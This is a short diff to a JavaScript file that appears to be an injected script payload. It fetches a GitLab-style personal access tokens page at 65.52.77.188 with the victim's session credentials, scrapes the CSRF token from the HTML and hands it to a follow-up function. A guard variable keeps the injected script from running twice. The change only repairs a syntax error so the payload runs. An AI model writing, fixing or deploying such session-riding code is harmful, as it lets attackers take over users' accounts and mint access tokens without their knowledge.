@@ -31,7 +31,8 @@ fetch("https://65.52.77.188/-/profile/personal_access_tokens", {
   });
 }
 
-function runner() = fetch(
+function runner(){
+  fetch(
     "https://65.52.77.188/-/profile/personal_access_tokens",
     {
       credentials: "include",
@@ -44,6 +45,7 @@ function runner() = fetch(
     const htmlDocument = parser.parseFromString(text, "text/html");
 var token = htmlDocument.documentElement.querySelector('meta[name="csrf-token"]').content;
     next(token)})
+}
 
 if(!donescript) {
   var donescript=true;
